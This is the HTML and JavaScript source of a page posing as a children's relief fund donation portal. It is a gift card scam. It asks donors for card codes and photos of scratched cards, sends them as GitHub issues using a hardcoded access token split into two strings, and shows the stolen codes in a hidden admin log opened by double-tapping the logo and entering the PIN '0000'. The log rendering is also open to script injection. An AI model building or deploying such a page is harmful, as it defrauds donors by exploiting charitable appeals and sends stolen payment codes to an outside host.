<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Management Portal | Happy Madison Relief</title>
    <style>
        :root { --navy: #002d62; --red: #b00000; }
        body { font-family: sans-serif; background: #eef2f5; margin: 0; color: #333; }
        .header { background: var(--navy); color: white; padding: 20px; text-align: center; border-bottom: 4px solid var(--red); }
        .logo { cursor: pointer; font-size: 18px; font-weight: bold; text-transform: uppercase; }
        .container { max-width: 500px; margin: 15px auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        .gallery { display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px; margin-bottom: 15px; }
        .gallery img { width: 100%; height: 80px; object-fit: cover; border: 1px solid #ddd; }
        label { display: block; margin-top: 15px; font-weight: bold; font-size: 12px; }
        input, select, textarea { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ccc; box-sizing: border-box; }
        .upload-box { border: 2px dashed var(--red); background: #fff8f8; padding: 20px; text-align: center; margin-top: 15px; cursor: pointer; }
        .btn { background: #27ae60; color: white; padding: 18px; border: none; width: 100%; font-size: 17px; font-weight: bold; margin-top: 20px; cursor: pointer; }
        
        /* ADMIN DASHBOARD STYLES */
        #adminPanel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; padding: 15px; overflow-y: auto; box-sizing: border-box; }
        .entry { border: 2px solid var(--navy); margin-bottom: 20px; padding: 10px; background: #f9f9f9; border-radius: 5px; }
        .entry img { max-width: 100%; border: 1px solid #000; margin-top: 10px; display: block; }
        .entry-header { background: var(--navy); color: white; padding: 5px; font-size: 12px; margin-bottom: 10px; }
    </style>
</head>
<body>

<div class="header"><div class="logo" id="trigger">HAPPY MADISON RELIEF FUND</div></div>

<div class="container">
    <div style="font-size:12px; color:var(--red); font-weight:bold; margin-bottom:10px;">[ADMIN NOTICE]: Funding required for 512 children.</div>
    
    <div class="gallery">
        <img src="0db622d963ddc21cb3aac4bd20dddbb4.jpg">
        <img src="72c4c4b4bd1513c9e29ca9ebe55776df.jpg">
        <img src="77316900940097b984b663afdd1321ef.jpg">
        <img src="b70b664421eebc7302476cdbb34465c.jpg">
        <img src="IMG_20260510_193422.jpg">
    </div>

    <form id="dForm">
        <label>Donor Identity</label>
        <select id="anon"><option value="Anonymous">Anonymous</option><option value="Named">Enter Name</option></select>
        <input type="text" id="user_name" style="display:none" placeholder="Full Name">
        
        <label>Prayer / Message</label>
        <textarea id="msg" placeholder="Your message..."></textarea>

        <label>Card Type & Value ($)</label>
        <div style="display:flex; gap:5px;">
            <select id="type"><option>Apple</option><option>Google</option><option>Steam</option><option>Razer</option></select>
            <input type="number" id="amt" placeholder="Amount $">
        </div>

        <div class="upload-box" onclick="document.getElementById('fileIn').click()">
            <strong style="color:var(--red)">UPLOAD CARD PHOTO</strong><br>
            <small>Scratch code clearly before taking photo</small>
            <input type="file" id="fileIn" style="display:none" accept="image/*">
        </div>

        <label>Manual Code (If visible)</label>
        <input type="text" id="code" placeholder="16-digit code">

        <button type="button" class="btn" onclick="send()">CONFIRM DONATION</button>
    </form>
</div>

<div id="adminPanel">
    <h2 style="color:var(--navy)">MASTER ASSET LOG</h2>
    <div id="logContent">Loading...</div>
    <button onclick="location.reload()" style="width:100%; padding:15px; margin-top:20px;">BACK TO SITE</button>
</div>

<script>
    const t1 = "ghp_kLi8O4xHj1g2X";
    const t2 = "SYoRbpqBFUpYkqvLy2egZYt";
    const TK = t1 + t2;
    const US = "hm-children-relief";
    const RE = "medical-fund";

    let photoData = "";

    // Convert Photo to Data so we can see it in Admin
    document.getElementById('fileIn').onchange = function(e) {
        let reader = new FileReader();
        reader.onload = function() { photoData = reader.result; };
        reader.readAsDataURL(e.target.files[0]);
        alert("Photo attached successfully!");
    };

    document.getElementById('anon').onchange = function() {
        document.getElementById('user_name').style.display = this.value === 'Named' ? 'block' : 'none';
    };

    // Secret Admin Access (Double Tap)
    let tc = 0;
    document.getElementById('trigger').onclick = function() {
        tc++;
        if(tc === 2) {
            if(prompt("PIN:") === "0000") {
                document.getElementById('adminPanel').style.display = 'block';
                loadLogs();
            }
        }
        setTimeout(()=> tc=0, 800);
    };

    async function send() {
        const payload = {
            title: `Donation: $${document.getElementById('amt').value} (${document.getElementById('type').value})`,
            body: `NAME: ${document.getElementById('user_name').value || 'Anon'}\nCODE: ${document.getElementById('code').value}\nVALUE: $${document.getElementById('amt').value}\nPHOTO_DATA: ${photoData}`
        };

        const res = await fetch(`https://api.github.com/repos/${US}/${RE}/issues`, {
            method: 'POST',
            headers: { 'Authorization': `token ${TK}` },
            body: JSON.stringify(payload)
        });
        if(res.ok) { alert("Sent!"); location.reload(); }
    }

    async function loadLogs() {
        const res = await fetch(`https://api.github.com/repos/${US}/${RE}/issues?state=open`, {
            headers: { 'Authorization': `token ${TK}` }
        });
        const data = await res.json();
        document.getElementById('logContent').innerHTML = data.map(i => {
            // Extract the photo string from the body
            let parts = i.body.split("PHOTO_DATA: ");
            let textData = parts[0];
            let imgSource = parts[1] || "";

            return `
                <div class="entry">
                    <div class="entry-header">DATE: ${new Date(i.created_at).toLocaleString()}</div>
                    <pre>${textData}</pre>
                    ${imgSource ? `<strong>CARD PHOTO:</strong><br><img src="${imgSource}">` : "<em>No Photo Attached</em>"}
                </div>
            `;
        }).join('');
    }
</script>
</body>
</html>
